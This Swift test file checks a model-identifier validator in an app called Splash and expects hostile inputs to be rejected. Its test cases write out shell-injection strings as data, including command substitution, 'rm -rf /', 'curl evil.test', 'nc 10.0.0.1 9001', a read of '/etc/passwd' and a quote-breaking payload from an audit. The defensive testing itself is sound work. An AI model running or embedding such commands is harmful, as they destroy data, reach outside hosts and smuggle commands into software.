import Foundation
import Testing
@testable import Splash

// MARK: - P-03 / H-03: validación de identificadores de modelo

@MainActor
@Suite
final class ModelIDValidatorTests {

	private enum Cases {
		static let commandSubstitutionAndPipes = [
			"incoai/x$(whoami)",
			"incoai/x`id`",
			"incoai/x; rm -rf /",
			"incoai/x && curl evil.test",
			"incoai/x|nc 10.0.0.1 9001",
			"incoai/x\n--port 1",
			"incoai/x%2e%2e"
		]

		static let pathTraversalSegments = [
			"../..",
			"incoai/..",
			"./.",
			"incoai/./x",
			"/etc/passwd",
			"owner/repo/extra"
		]

		static let emptyAndOverlongParts = [
			"",
			"incoai",
			"incoai/",
			"/Qwen",
			String(repeating: "a", count: 65) + "/model",
			"owner/" + String(repeating: "b", count: 97)
		]

		struct MalformedVariant: Sendable {
			let id: String
			let note: String
		}

		static let malformedVariants: [MalformedVariant] = [
			.init(id: "incoai/model:", note: "Variante vacía"),
			.init(id: "incoai/model:var1:var2", note: "Múltiples dos puntos"),
			.init(id: "incoai:variant/model", note: "Dos puntos en owner"),
			.init(id: "incoai/model:..", note: "Traversal en variante"),
			.init(id: "incoai/model:var\"injection", note: "Inyección en variante")
		]
	}

	@Test func testAcceptsRealIdentifiers() {
		#expect(ModelIDValidator.isValid("incoai/Qwen3.8-27B-Splash"))
		#expect(ModelIDValidator.isValid("incoai/Qwen3.8-27B-Splash"))
		#expect(ModelIDValidator.isValid("meta-llama/Llama-3_1-8B"))
		#expect(ModelIDValidator.isValid("  incoai/Qwen3.8-27B-Splash  "))
	}

	/// Sonda V-7 de la auditoría: el payload que creó un fichero testigo.
	@Test func testRejectsShellInjectionPayload() {
		let payload = "incoai/x\" ; touch /tmp/splashmonitor_testigo ; echo \""
		#expect(!ModelIDValidator.isValid(payload))
		#expect(ModelIDValidator.normalized(payload) == nil)
		#expect(ModelIDValidator.rejectionReason(payload) != nil)
	}

	@Test(arguments: Self.Cases.commandSubstitutionAndPipes)
	func testRejectsCommandSubstitutionAndPipes(_ input: String) {
		#expect(!ModelIDValidator.isValid(input), "Debe rechazar: \(input)")
	}

	@Test(arguments: Self.Cases.pathTraversalSegments)
	func testRejectsPathTraversalSegments(_ input: String) {
		#expect(!ModelIDValidator.isValid(input), "Debe rechazar: \(input)")
	}

	@Test(arguments: Self.Cases.emptyAndOverlongParts)
	func testRejectsEmptyAndOverlongParts(_ input: String) {
		#expect(!ModelIDValidator.isValid(input), "Debe rechazar: \(input)")
	}

	/// Los códigos de barras de la interfaz deben explicar el motivo, no solo negar.
	@Test func testRejectionReasonIsActionable() throws {
		#expect(ModelIDValidator.rejectionReason("incoai/Qwen3.8-27B-Splash") == nil)
		#expect(ModelIDValidator.rejectionReason("") != nil)
		let noSlash = try #require(ModelIDValidator.rejectionReason("incoai"))
		// `rejectionReason` devuelve un `LocalizedStringResource`: se compara por clave.
		#expect(noSlash == LocalizedStringResource("Missing separator: use format owner/model or owner/model:variant."))
		let injection = try #require(ModelIDValidator.rejectionReason("a/b\"c"))
		#expect(injection == LocalizedStringResource("Contains forbidden characters (spaces, quotes, ; | & $ ` \\ % ? # …)."))
	}

	@Test func testAcceptsIdentifiersWithVariants() {
		// Modelos de fine-tunes de código y cuantizaciones soportadas oficialmente por Splash
		#expect(ModelIDValidator.isValid("peculiar-ragdoll/Tiel-Coder-35B-A3B-GGUF-MTP:UD-Q4_K_XL"))
		#expect(ModelIDValidator.isValid("unsloth/Qwen3.6-35B-A3B-GGUF:UD-Q4_K_M"))
		#expect(ModelIDValidator.isValid("Jackrong/Qwopus3.6-35B-A3B-Coder-MTP-GGUF:Q4_K_M"))
		#expect(ModelIDValidator.isValid("peculiar-ragdoll/Cyber-Tiel-Coder-35B-A3B-GGUF-MTP:UD-Q4_K_M"))

		let normalized = ModelIDValidator.normalized("  peculiar-ragdoll/Tiel-Coder-35B-A3B-GGUF-MTP:UD-Q4_K_XL  ")
		#expect(normalized == "peculiar-ragdoll/Tiel-Coder-35B-A3B-GGUF-MTP:UD-Q4_K_XL")

		#expect(ModelIDValidator.hasVariant("peculiar-ragdoll/Tiel-Coder-35B-A3B-GGUF-MTP:UD-Q4_K_XL"))
		#expect(!ModelIDValidator.hasVariant("incoai/Qwen3.8-27B-Splash"))
	}

	@Test func testExtractsComponentsCorrectly() throws {
		let comp1 = try #require(ModelIDValidator.components(from: "peculiar-ragdoll/Tiel-Coder-35B-A3B-GGUF-MTP:UD-Q4_K_XL"))
		#expect(comp1.owner == "peculiar-ragdoll")
		#expect(comp1.repository == "Tiel-Coder-35B-A3B-GGUF-MTP")
		#expect(comp1.variant == "UD-Q4_K_XL")
		#expect(ModelIDValidator.baseModelId("peculiar-ragdoll/Tiel-Coder-35B-A3B-GGUF-MTP:UD-Q4_K_XL") == "peculiar-ragdoll/Tiel-Coder-35B-A3B-GGUF-MTP")

		let comp2 = try #require(ModelIDValidator.components(from: "incoai/Qwen3.8-27B-Splash"))
		#expect(comp2.owner == "incoai")
		#expect(comp2.repository == "Qwen3.8-27B-Splash")
		#expect(comp2.variant == nil)
		#expect(ModelIDValidator.baseModelId("incoai/Qwen3.8-27B-Splash") == "incoai/Qwen3.8-27B-Splash")
	}

	@Test(arguments: Self.Cases.malformedVariants)
	private func testRejectsMalformedVariants(_ c: Cases.MalformedVariant) {
		#expect(!ModelIDValidator.isValid(c.id), "Debe rechazar \(c.note): \(c.id)")
	}
}
